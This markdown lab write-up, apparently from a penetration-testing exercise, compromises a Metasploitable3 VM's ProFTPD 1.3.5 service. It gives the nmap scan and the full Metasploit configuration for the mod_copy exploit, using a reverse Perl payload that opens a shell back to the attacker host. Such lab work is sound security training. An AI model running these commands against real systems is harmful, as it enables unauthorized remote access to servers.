# Phase 1: Service Compromise
---

## ✅ Task 1.1: Exploiting the Service Using Metasploit

---
## ✅ Step 1: Environment Setup

- **Victim VM**: Metasploitable3
- **Attacker VM**: Kali Linux
- **Network Type**: Host-Only
- **Victim IP**: 192.168.168.129
- **Tool Used**: Metasploit
- **Vulnerable Service To Exploit**: FTP

## ✅ Step 2: Service Enumeration using Nmap

An Nmap scan was performed to identify open services on the victim machine.

### Command:

```bash
nmap -sV 192.168.168.129
```

The scan revealed several open ports, including FTP (ProFTPD 1.3.5) on port 21, which was chosen as the target for this phase.

 
![Nmap Scan](./metasploit_screenshots/nmap_scan.png)

## ✅ Step 3: Identifying the Vulnerable FTP Service

After discovering that port 21 was open and running **ProFTPD 1.3.5**, Metasploit was used to search for known exploits targeting this specific version of the FTP service.

### 🔧 Metasploit Search Command:

```bash
search proftpd type:exploit
```

This returned several results. Among them, the following module was selected as the most suitable for our target:

Module: exploit/unix/ftp/proftpd_modcopy_exec

Rank: Excellent

Description: This exploit leverages the SITE CPFR/CPTO commands provided by the ProFTPD mod_copy module (enabled by default in 1.3.5). It allows remote attackers to copy a malicious PHP file into the web server directory, which can then be executed to obtain a reverse shell.

![Search result](./metasploit_screenshots/search_proftp.png)

## ✅ Step 4: Exploitation via Metasploit

The following commands were used to exploit the FTP service:

## 🔧 Exploit Configuration

1. **Set the Exploit Module:**

    ```bash
    use exploit/unix/ftp/proftpd_modcopy_exec
    ```

2. **Set the Target Host:**

    ```bash
    set RHOSTS 192.168.168.129
    ```

3. **Set the FTP Port (default 21):**

    ```bash
    set RPORT 21
    ```

4. **Set the Site Path (Web Root):**

    ```bash
    set SITEPATH /var/www/html
    ```

5. **Set the Payload:**

    ```bash
    set payload cmd/unix/reverse_perl
    ```

6. **Set the Attacker's IP (LHOST):**

    ```bash
    set LHOST 192.168.168.128
    ```

7. **Launch the Exploit:**

    ```bash
    exploit
    ```


Result:
* The exploit successfully copied a malicious PHP payload into the web server's root directory.
* Triggering the payload resulted in a reverse shell being established on the attacker's machine.

### Post-Exploitation Verification

Once the reverse shell was successfully established, the following commands were executed to confirm the current access level and working directory:

1. **Check the current user:**
    ```bash
    whoami
    ```

2. **Check the present working directory:**
    ```bash
    pwd
    ```

**Result:**
- **User:** `www-data`
- **Directory:** `/var/www/html`

![reverse shell](./metasploit_screenshots/reverse_shell.png)
